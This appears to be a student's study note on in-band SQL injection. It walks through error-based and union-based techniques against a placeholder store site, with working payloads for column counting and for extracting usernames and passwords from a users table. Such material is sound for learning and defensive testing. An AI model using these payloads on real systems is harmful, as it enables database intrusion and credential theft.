
# Theory

SQLi is a security vulnerability where attackers send malicious SQL code through input fields to manipulate backend databases. In-band SQLi is a form of SQL injection where attackers uses a communication medium to exploit the vulnerability and uses the same communication medium to gather the results.

## Key Aspects

	Simple
	Direct Feedback
	Types: Error Based & Union Based

# Scenarios
## Error Based SQLi

![[Pasted image 20260427150702.png]]

URL:

`https://store.test/product?id=10`

Backend query:
`SELECT * FROM products WHERE id = 10;`

b. Modify the request to test for Error-Based SQL Injection
- Error-based SQLi relies on generating **database errors** that reveal information.
- Common techniques: division by zero, invalid type conversion, or deliberately malformed SQL.

```
https://store.test/product?id=10 AND 1=CONVERT(INT,'invalid')--
```

```
https://store.test/product?id=10 AND 1=1/0--
```

- If the page shows a database error message, it is **vulnerable to error-based SQLi**.


c. Conditions required for Error-Based SQL Injection

1. The database must **return error messages** to the application.
    
2. The query must allow **malformed or invalid expressions** (e.g., division by zero, invalid conversions).
    
3. Error output must reveal **information about the database, table, or query structure**.
    

> Unlike UNION-based SQLi, there is **no need to count columns** here; the focus is on forcing the database to reveal information via errors.

 d. Determine useful information

Error-based SQLi can be used to extract:

- Database name
    
- Table names
    
- Column names
    
- Data from specific columns
    

**Example pattern:**

- Force an error that reveals ASCII values of characters in the database:
    

```
https://store.test/product?id=10 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--
```

- This is more advanced and used to **extract database info** via errors.
    
- In a simpler lab, just triggering `1=1/0` or invalid conversion is enough to **test for vulnerability**.
    

e. Craft a payload to extract placeholder data

Assume there is a `users` table with columns `placeholder_username` and `placeholder_password`:

```
https://store.test/product?id=10 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(placeholder_username,0x3a,placeholder_password) FROM users)a)--
```

- The database error may reveal the concatenated values in the error message.
    
- This is **how error-based SQLi allows direct retrieval of data via database errors**.
    


## Union Based SQLi

![[Pasted image 20260427150702.png]]

A product page fetches details of table products, the input product ID using URL:
`https://store.test/product?id=10`

a. Predict the Backend query.
`SELECT * FROM products WHERE id = 10;`

b. Modify the request to test for UNION-based SQL Injection.
`https://store.test/product?id=10 UNION SELECT 1,2,3--`

c. State the conditions required for UNION-based SQL Injection.
- Original query must return **at least one row**
- **Number of columns must match** between original query and injected `UNION SELECT`
- **Data types** of injected columns must be compatible
- Results of `UNION` must be **displayed on the page**

d. How will you determine the correct number of columns in the vulnerable query?

i. Using ORDER BY

Test incrementally:
```
https://store.test/product?id=10 ORDER BY 1--  
https://store.test/product?id=10 ORDER BY 2--  
https://store.test/product?id=10 ORDER BY 3--
```

Order By sorts the columns based on the index provided in the query. If `ORDER BY 1` is executed then backend sorts first column of the database. Incrementally doing this:
- Error occurs if you exceed the number of columns
- Last successful number = correct number of columns

ii. Using UNION SELECT

Test incrementally:

```
https://store.test/product?id=10 UNION SELECT 1--  {Error}
https://store.test/product?id=10 UNION SELECT 1,2--  {Error}
https://store.test/product?id=10 UNION SELECT 1,2,3-- {Correct}
https://store.test/product?id=10 UNION SELECT 1,2,3,4-- {Error}
```
Union merges two SELECT queries into one, so if count of columns in the second SELECT query doesn't match with the original query then it throws an error
- Success without errors = correct number of columns

e. Craft a payload to extract username and password from the users table
`https://store.test/product?id=10 UNION SELECT username, password, 3 FROM users--`